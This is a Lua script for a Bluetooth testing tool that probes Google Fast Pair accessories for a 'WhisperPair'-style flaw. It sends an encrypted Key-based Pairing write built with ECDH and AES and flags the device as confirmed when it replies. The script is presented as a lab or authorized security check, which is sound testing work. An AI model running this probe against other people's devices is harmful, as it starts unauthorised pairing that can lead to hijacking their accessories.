-- Quick action: first Key-based Pairing write (anti-spoofing / WhisperPair-style probe).
-- UUIDs come from manifest uuids.json as globals uuids.* (LuaDeviceGlobals).
-- Uses fp_get("fast_pair_wp_toolkit_public_key_hex") when already enriched; otherwise reads
-- Model ID from uuids.CHR_MODEL_ID and calls fp_apply_fast_pair_post_enrich() after fp_set model id.
-- For lab / authorized testing only; requires the Provider in pairing mode per spec.
--
-- Ref: https://developers.google.com/nearby/fast-pair/specifications/characteristics

local FLAGS = 0x00

local function fp_uuids()
  if type(uuids) ~= "table" then
    return nil, nil, nil, "uuids table missing — open script from Fast Pair device pack"
  end
  local svc = uuids.SVC_FAST_PAIR
  local model_chr = uuids.CHR_MODEL_ID
  local kbp_chr = uuids.CHR_KEY_BASED_PAIRING
  if not svc or svc == "" or not model_chr or model_chr == "" or not kbp_chr or kbp_chr == "" then
    return nil, nil, nil, "uuids.json missing SVC_FAST_PAIR / CHR_MODEL_ID / CHR_KEY_BASED_PAIRING"
  end
  return svc, model_chr, kbp_chr, nil
end

local function bin_len(s)
  if not s then return 0 end
  return #s
end

local function norm_hex(h)
  if not h then return "" end
  return (h:gsub("%s+", "")):lower()
end

local function strip_04_if_present(as_bin)
  local n = bin_len(as_bin)
  if n == 65 and string.byte(as_bin, 1) == 0x04 then
    return string.sub(as_bin, 2)
  end
  return as_bin
end

local function read_model_id_hex6(svc, chr_model_id)
  if gatt_has_characteristic(svc, chr_model_id) ~= true then
    log("Fast Pair: Model ID characteristic not found on connection")
    return nil
  end
  local hex = norm_hex(ble_read(svc, chr_model_id))
  if hex == "" or #hex < 6 then
    log("Fast Pair: Model ID read empty or too short")
    return nil
  end
  return hex:sub(1, 6)
end

local WHISPER_PAIR_TITLE_SUFFIX = " · WhisperPair confirmed"

local function scan_row_base_title()
  local b = fp_get("enrichment_display_name")
  if b and b ~= "" then
    return b
  end
  b = fp_get("display_name")
  if b and b ~= "" then
    return b
  end
  return gatt_address()
end

--- Append suffix to scan-row title when probe gets KBP NOTIFY (uses overlay that wins over ADV name).
local function apply_whisper_pair_confirmed_title()
  local base = scan_row_base_title()
  if base:find("WhisperPair confirmed", 1, true) then
    fp_set("enrichment_display_name", base)
    return
  end
  fp_set("enrichment_display_name", base .. WHISPER_PAIR_TITLE_SUFFIX)
end

--- Resolve anti-spoofing public key hex: use fingerprint overlay or GATT Model ID → toolkit enrichment.
local function ensure_toolkit_public_key(svc, chr_model_id)
  local pk = fp_get("fast_pair_wp_toolkit_public_key_hex")
  if pk and pk ~= "" then
    return pk
  end
  log("Missing fast_pair_wp_toolkit_public_key_hex — reading Model ID from GATT …")
  local mid6 = read_model_id_hex6(svc, chr_model_id)
  if not mid6 then
    return nil
  end
  fp_set("fast_pair_gatt_model_id_hex", mid6)
  fp_apply_fast_pair_post_enrich()
  pk = fp_get("fast_pair_wp_toolkit_public_key_hex")
  if not pk or pk == "" then
    log(
      "No WhisperPair toolkit public key after GATT Model ID (0x"
        .. mid6
        .. ") — unknown or offline toolkit row"
    )
    return nil
  end
  log("Toolkit public key resolved from Model ID 0x" .. mid6)
  return pk
end

function run()
  local SVC_FP, CHR_MODEL_ID, CHR_KBP, uerr = fp_uuids()
  if not SVC_FP then
    log(uerr)
    return
  end

  if gatt_has_characteristic(SVC_FP, CHR_KBP) == false then
    log("Fast Pair: Key-based Pairing characteristic not found")
    return
  end

  local hex_pk = ensure_toolkit_public_key(SVC_FP, CHR_MODEL_ID)
  if not hex_pk then
    return
  end

  local as_pub = hex_to_bin(hex_pk)
  as_pub = strip_04_if_present(as_pub)
  if bin_len(as_pub) ~= 64 then
    log(
      "Anti-spoofing public key must be 64 octets (128 hex) after optional 04 strip, got length "
        .. bin_len(as_pub)
    )
    return
  end

  local addr_fp = gatt_address_fast_pair_uint48()
  if bin_len(addr_fp) ~= 6 then
    log("gatt_address_fast_pair_uint48: expected 6 octets")
    return
  end

  local salt = random_bytes(8)
  local raw = string.char(0x00) .. string.char(FLAGS) .. addr_fp .. salt
  if bin_len(raw) ~= 16 then
    log("internal: raw KBP block length " .. bin_len(raw))
    return
  end

  local epriv, epub = ecdh_generate_keypair()
  local secret = ecdh_compute_shared(epriv, as_pub)
  local k_aes = sha256_first_16(secret)
  local enc = aes_ecb_encrypt(k_aes, raw)

  local wire = enc .. epub
  local wire_hex = bin_to_hex(wire)

  log("Fast Pair KBP: write " .. bin_len(wire) .. " octets (enc+ephemeral pub), gatt=" .. gatt_address())

  ble_subscribe(SVC_FP, CHR_KBP)
  start_notify_wait(SVC_FP, CHR_KBP)

  local ok = ble_write(SVC_FP, CHR_KBP, wire_hex, false)
  if not ok then
    log("RESULT: FAIL — KBP characteristic write did not queue/complete.")
    fp_append(
      "google_fast_pair_kbp_probe",
      {
        kb_probe_verdict = "write_failed",
        kb_whisper_pair_confirmed = false,
        kb_write_ok = false,
        kb_notify_hex = "",
        kb_flags = FLAGS,
        gatt_mac = gatt_address(),
      },
      "Fast Pair KBP probe"
    )
    return
  end

  local resp_hex = finish_notify_wait(SVC_FP, CHR_KBP, 8000)
  local notified = resp_hex ~= nil and resp_hex ~= ""

  if notified then
    log("Fast Pair KBP: notify (hex) = " .. resp_hex)
    log("RESULT: PASS — WhisperPair confirmed (Provider returned KBP NOTIFY).")
    apply_whisper_pair_confirmed_title()
  else
    log("Fast Pair KBP: no notify within timeout (device may not be in pairing mode or ignored write)")
    log("RESULT: INCONCLUSIVE — write OK but no NOTIFY within timeout.")
  end

  fp_append(
    "google_fast_pair_kbp_probe",
    {
      kb_probe_verdict = notified and "whisper_pair_confirmed" or "no_notify_timeout",
      kb_whisper_pair_confirmed = notified,
      kb_write_ok = ok,
      kb_notify_hex = resp_hex or "",
      kb_flags = FLAGS,
      gatt_mac = gatt_address(),
    },
    "Fast Pair KBP probe"
  )
end
